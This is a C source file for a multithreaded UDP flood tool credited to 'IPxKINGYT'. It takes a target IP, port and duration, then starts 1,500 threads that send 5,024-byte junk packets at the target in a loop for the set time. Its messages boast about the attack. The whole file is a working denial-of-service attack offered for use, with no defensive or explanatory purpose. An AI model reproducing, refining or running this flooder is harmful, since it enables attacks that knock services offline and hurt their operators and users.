#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>

#define MAX_THREADS 1500
#define PAYLOAD_SIZE 5024  // IPxKINGYT©2024

typedef struct {
    char ip[16];
    int port;
    int duration;
} AttackParams;

void* send_payload(void* arg) {
    AttackParams* params = (AttackParams*)arg;
    int sock;
    struct sockaddr_in server_addr;
    char payload[PAYLOAD_SIZE];

    memset(payload, 'A', PAYLOAD_SIZE - 1);
    payload[PAYLOAD_SIZE - 1] = '\0';

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->port);
    server_addr.sin_addr.s_addr = inet_addr(params->ip);

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < params->duration) {
        if (sendto(sock, payload, PAYLOAD_SIZE, 0, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            perror("Send failed");
            break;
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        printf("Usage: ./IPxKINGYT <IP> <PORT> <DURATION>\n");
        return 1;
    }

    AttackParams params;
    strncpy(params.ip, argv[1], sizeof(params.ip) - 1);
    params.ip[sizeof(params.ip) - 1] = '\0';  // Ensure null termination
    params.port = atoi(argv[2]);
    params.duration = atoi(argv[3]);

    pthread_t threads[MAX_THREADS];

    printf("MADE BY @IPxKINGYT %s:%d for %d seconds with %d threads...\n",
           params.ip, params.port, params.duration, MAX_THREADS);

    for (int i = 0; i < MAX_THREADS; i++) {
        if (pthread_create(&threads[i], NULL, send_payload, &params) != 0) {
            perror("Thread creation failed");
        }
    }

    for (int i = 0; i < MAX_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("FUCKED ATTACK @IPxKINGYT HOST IP %s on port %d for %d seconds\n",
           params.ip, params.port, params.duration);

    return 0;
}

// IPxKINGYT©2024-2025
